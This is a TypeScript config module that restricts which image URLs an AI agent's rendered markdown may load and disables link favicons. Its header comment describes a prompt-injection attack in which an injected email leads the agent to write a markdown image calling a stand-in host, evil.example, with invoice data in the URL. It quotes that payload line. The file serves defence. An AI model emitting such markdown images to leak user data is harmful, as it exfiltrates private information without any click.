// app/lib/agent/markdown-harden.ts
//
// Cycle 79b fix round 1 (C1): model-written markdown must never make the browser request a URL
// the model chose. vue-stream-markdown's defaults allow images from ANY origin, so an injected
// email could have Bridget write `![](https://evil.example/p.png?d=<invoice totals>)` and the
// data would leave the moment Tony looked at the reply — zero clicks, no tool call, no taint gate.
//
// Images: only same-origin `/api/images/…` (the server-authored embeds, image-embed.ts) render;
// anything else (absolute, protocol-relative, reference-style, raw <img>, data:) has its `src`
// stripped by the parser's security plugin, so no request is made. Links stay clickable (a click
// is Tony's choice and the library confirms external links), but link favicons are OFF — a
// favicon is fetched for the link's host without a click.
//
// Not done here (follow-up): an app-wide CSP `img-src` backstop — it would also cover MDC/MdView.

/** Path prefixes an image in agent-rendered markdown may load from. */
export const AGENT_IMAGE_PREFIXES: readonly string[] = ['/api/images/']

/** `hardenOptions` for every vue-stream-markdown <Markdown> that renders model text. */
export const agentMarkdownHarden = {
  allowedImagePrefixes: [...AGENT_IMAGE_PREFIXES],
  allowDataImages: false
}

/** `linkOptions`: no favicon fetch for links in model text. */
export const agentMarkdownLinkOptions = { favicon: false } as const
